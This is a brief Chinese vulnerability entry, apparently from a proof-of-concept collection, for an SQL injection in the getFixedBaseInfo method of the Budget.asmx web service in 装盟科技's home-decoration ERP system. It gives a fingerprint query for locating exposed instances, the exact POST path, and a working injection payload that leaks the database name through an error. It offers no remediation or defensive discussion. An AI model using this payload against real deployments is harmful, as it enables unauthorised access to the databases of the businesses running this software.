# 装盟科技-家装ERP管理系统Budget.asmx存在SQL注入漏洞

装盟科技-家装ERP管理系统 ｜ SQL注入 ｜ —
- **指纹**：`app="装盟科技-家装ERP管理系统"`
- **请求**：`POST /WEB_SERVICE/Budget.asmx/getFixedBaseInfo HTTP/1.1`

**Payload**
```
where=1=db_name()&intPageIndex=1&pageSize=20
```
- **响应特征**：200